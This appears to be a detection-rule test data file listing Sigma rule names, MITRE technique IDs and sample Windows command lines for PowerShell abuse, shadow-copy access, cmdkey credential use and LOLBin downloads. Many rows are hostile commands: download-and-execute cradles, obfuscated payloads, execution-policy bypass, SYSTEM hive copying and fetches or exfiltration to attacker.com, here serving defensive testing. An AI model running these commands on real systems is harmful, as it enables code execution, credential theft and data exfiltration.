Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();iex $comMsXml.ResponseText"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();[System.Management.Automation.Cmdlet]::InvokeCommand().InvokeScript($comMsXml.ResponseText)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();(Get-Command iex).Invoke($comMsXml.ResponseText)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$scriptBlock = [scriptblock]::Create($comMsXml.ResponseText);& $scriptBlock"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$null = $comMsXml.ResponseText | iex"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_iex_patterns	Suspicious PowerShell IEX Execution Patterns	09576804-7a05-458e-a817-eb718ca91f54		"powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();$comMsXml.ResponseText|iex"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_import_module_susp_dirs	Import PowerShell Modules From Suspicious Directories - ProcCreation	c31364f7-8be6-4b77-8483-dd2b5a7b69a3		"powershell.exe -Command ""Import-Module '$Env:Temp\suspicious_module.psm1'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_import_module_susp_dirs	Import PowerShell Modules From Suspicious Directories - ProcCreation	c31364f7-8be6-4b77-8483-dd2b5a7b69a3		"powershell.exe -Command ""Import-Module $Env:Temp\\suspicious_module.psm1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_import_module_susp_dirs	Import PowerShell Modules From Suspicious Directories - ProcCreation	c31364f7-8be6-4b77-8483-dd2b5a7b69a3		"powershell.exe -Command ""Import-Module ($Env:Temp + '\\suspicious_module.psm1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_import_module_susp_dirs	Import PowerShell Modules From Suspicious Directories - ProcCreation	c31364f7-8be6-4b77-8483-dd2b5a7b69a3		"powershell.exe -Command ""ipmo $Env:Temp\\suspicious_module.psm1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_import_module_susp_dirs	Import PowerShell Modules From Suspicious Directories - ProcCreation	c31364f7-8be6-4b77-8483-dd2b5a7b69a3		"powershell.exe -Command ""Import-Module ($Env:AppData + '\\suspicious_module.psm1')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host (\""[char]\"" 0x41)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host ([System.Char]0x41)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host (\""[char]\"" 65)"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host ([Convert]::ToChar(0x41))"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host ([char]([Convert]::ToInt32(\""A\"", 16)))"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_obfuscation_via_utf8	Potential PowerShell Obfuscation Via WCHAR/CHAR	e312efd0-35a1-407f-8439-b8d434b438a6		"powershell.exe -Command ""Write-Host ([char](0x41))"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -file ""C:\Users\Public\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -File ""C:\Users\Public\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -f ""C:\Users\Public\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -Command ""& { . 'C:\Users\Public\script.ps1' }"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -Command ""& 'C:\Users\Public\script.ps1'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -ep Bypass -File ""C:\Users\Public\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -File ""%Public%\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -File ""C:\Users\Public\script.ps1"" -Command ""Write-Output 'Test'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -File ""C:\Users\Public\script.ps1"" -noprofile"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_public_folder	Execution of Powershell Script in Public Folder	fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4		"powershell.exe -File ""C:\Users\Public\script.ps1"" -Command ""& 'C:\Users\Public\script.ps1'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -exec bypass -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ExecutionPolicy Bypass -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ep Bypass -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ExecutionPolicy Unrestricted -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ep Unrestricted -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ExecutionPolicy Bypass -Command Get-ExecutionPolicy	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ep Bypass -Command Get-ExecutionPolicy	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ExecutionPolicy Bypass -Scope CurrentUser -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		powershell.exe -ep Bypass -Scope CurrentUser -File script.ps1	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_set_policies_to_unsecure_level	Change PowerShell Policies to an Insecure Level	87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180		"powershell.exe -ExecutionPolicy Bypass -Command ""Set-ExecutionPolicy Bypass -Scope CurrentUser"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_snapins_hafnium	Exchange PowerShell Snap-Ins Usage	25676e10-2121-446e-80a4-71ff8506af47		"powershell.exe -Command ""Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_snapins_hafnium	Exchange PowerShell Snap-Ins Usage	25676e10-2121-446e-80a4-71ff8506af47		powershell.exe -c Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_snapins_hafnium	Exchange PowerShell Snap-Ins Usage	25676e10-2121-446e-80a4-71ff8506af47		powershell.exe -Command Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_snapins_hafnium	Exchange PowerShell Snap-Ins Usage	25676e10-2121-446e-80a4-71ff8506af47		pwsh.exe -Command Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_snapins_hafnium	Exchange PowerShell Snap-Ins Usage	25676e10-2121-446e-80a4-71ff8506af47		"powershell.exe -Command ""Add-PSSnapin Microsoft.Exchange.Powershell.Snapin"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parameter_variation	Suspicious PowerShell Parameter Substring	36210e0d-5b19-485d-a087-c096088885f0		"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Write-Host 'Testing Rule Scope'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parameter_variation	Suspicious PowerShell Parameter Substring	36210e0d-5b19-485d-a087-c096088885f0		"powershell.exe -win h -exec bypass -c ""Write-Host 'Testing Rule Scope'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parameter_variation	Suspicious PowerShell Parameter Substring	36210e0d-5b19-485d-a087-c096088885f0		"powershell.exe -win h -exec bypass -Command ""Write-Host 'Testing Rule Scope'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parameter_variation	Suspicious PowerShell Parameter Substring	36210e0d-5b19-485d-a087-c096088885f0		"powershell.exe -win h -exec bypass -Command ""Write-Host 'Testing Rule Scope'"" -noprofile"	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parameter_variation	Suspicious PowerShell Parameter Substring	36210e0d-5b19-485d-a087-c096088885f0		"powershell.exe -WindowStyle h -ExecutionPolicy bypass -Command ""Write-Host 'Testing Rule Scope'"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		C:\WINDOWS\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		InstallUtil.exe /logfile= /LogToConsole=false /U CustomPowerShellRunspace.dll	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		"schtasks /create /tn ""TaskBypass"" /tr ""powershell.exe -ExecutionPolicy Bypass -Command Write-Host 'Bypassed'"" /sc once /st 00:00 /f && schtasks /run /tn ""TaskBypass"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_parent_process	Suspicious PowerShell Parent Process	754ed792-634f-40ae-b3bc-e0448d33f695		"wmic process call create ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ping 127.0.0.1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_appdata	PowerShell Script Run in AppData	ac175779-025a-4f12-98b0-acdaeb77ea85		"powershell.exe -Command ""& {Invoke-Expression (Get-Content $env:LOCALAPPDATA\payload.ps1 -Raw)}"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_appdata	PowerShell Script Run in AppData	ac175779-025a-4f12-98b0-acdaeb77ea85		"pwsh -c ""& $env:APPDATA\script.ps1"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_appdata	PowerShell Script Run in AppData	ac175779-025a-4f12-98b0-acdaeb77ea85		"powershell.exe -Command ""& {iex (gc $env:APPDATA\script.ps1 -Raw)}"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object System.Net.Web`Client).DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object System.N'et.WebClient').DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', '$env:TEMP\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\t'+'est.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"pwsh.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_susp_ps_downloadfile	PowerShell DownloadFile	8f70ac5f-1f6f-4f8e-b454-db19561216c5		"powershell.exe -Command ""$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_webclient_casing	Net WebClient Casing Anomalies	c86133ad-4725-4bd0-8170-210788e0a7ba		powershell.exe -EncodedCommand TgBlAHcALQBPAGIAagBlAGMAdAAgAG4AYABFAHQALgBXAGABRQBiAEMAbABpAEUAbgBUAA==	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_webclient_casing	Net WebClient Casing Anomalies	c86133ad-4725-4bd0-8170-210788e0a7ba		powershell.exe -ENC TgBlAHcALQBPAGIAagBlAGMAdAAgAG4AYABFAHQALgBXAGABRQBiAEMAbABpAEUAbgBUAA==	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"powershell.exe -Command ""$plaintext = ([system.Text.Encoding]::UTF8.getBytes(`""Path`n----`nC:\Users\victim""`)) $key = `""abcdefghijklmnopqrstuvwxyz123456`"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"powershell.exe -Command ""`$bytes = 105,102; `$res = ''; `$bytes | % { `$res += [Convert]::ToChar(`$_ -bxor 5) }; Invoke-Expression `$res"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		"powershell.exe -Command ""`$k=42; `$arr=100,101; `$res=''; `$arr | % { `$res += [string](`$_ -bxor `$k) }; Write-Host `$res"""	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		powershell.exe -EncodedCommand JABzAGMAcgBpAHAAdAAgAD0AIAAiAC4ALgAuACIAOwAgACQAZABlAGMAbwBkAGUAZAAgAD0AIAAkAHMAYwByAGkAcAB0ACAAfAAgICUAIAB7ACAAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAyADUANQApACAAfQA7ACAASQBFAFgAIAAtAGoAbwBpAG4AIAAkAGQAZQBjAG8AZABlAGQA	FALSE	FALSE	FALSE	
t1059.001	proc_creation_win_powershell_xor_commandline	Suspicious XOR Encoded PowerShell Command	bb780e0c-16cf-4383-8383-1e5471db6cf9		powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File xor_payload.ps1	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		"cmd.exe /c copy ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM"" C:\temp\system.hive"	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		cmd.exe /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive	FALSE	FALSE	FALSE	
t1490	proc_creation_win_cmd_shadowcopy_access	Copy From VolumeShadowCopy Via Cmd.EXE	c73124a7-3e89-44a3-bdc1-25fe4df754b1		"cmd.exe /c ""copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive"""	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"""C:\\WINDOWS\\system32\\cmdkey.exe"" /generic:TERMSRV/THAIMX /user:THAIMX\\thaim /pass:1password2!"	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"""C:\\WINDOWS\\system32\\cmdkey.exe"" -g TERMSRV/THAIMX -u THAIMX\\thaim -p 1password2!"	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"""C:\\WINDOWS\\system32\\cmdkey.exe"" -gTERMSRV/THAIMX -uTHAIMX\\thaim -p1password2!"	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"""C:\\WINDOWS\\system32\\cmdkey.exe"" -u THAIMX\\thaim -g TERMSRV/THAIMX -p 1password2!"	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_adding_generic_creds	New Generic Credentials Added Via Cmdkey.EXE	b1ec66c6-f4d1-4b5c-96dd-af28ccae7727		"""C:\\WINDOWS\\system32\\cmdkey.exe"" -g TERMSRV/THAIMX -u THAIMX\\thaim -p 1password2!"""	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey  /list	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey /list	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey.exe  /list	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		"""cmdkey"" /list"	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey  /l	FALSE	FALSE	FALSE	
t1003.005	proc_creation_win_cmdkey_recon	Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE	07f8bdc2-c9b3-472a-9817-5a670b872f53		cmdkey  /L	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com/file.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe ftp://attacker.com/payload.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe https://attacker.com/malware.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe -Url http://attacker.com/data.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		"ConfigSecurityPolicy.exe ""http://attacker.com/evil.exe"""	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com/\file.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com payload.exe	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com/file.exe --verbose	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com/file.exe > output.log	FALSE	FALSE	FALSE	
t1567	proc_creation_win_configsecuritypolicy_download_file	Arbitrary File Download Via ConfigSecurityPolicy.EXE	1f0f6176-6482-4027-b151-00071af39d7e		ConfigSecurityPolicy.exe http://attacker.com/file.exe 2>&1	FALSE	FALSE	FALSE	
t1567	proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil	LOLBAS Data Exfiltration by DataSvcUtil.exe	e290b10b-1023-4452-a4a9-eb31a9013b3a		DataSvcUtil.exe /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs /in:C:\Windows\Temp\input.cs	FALSE	FALSE	FALSE	
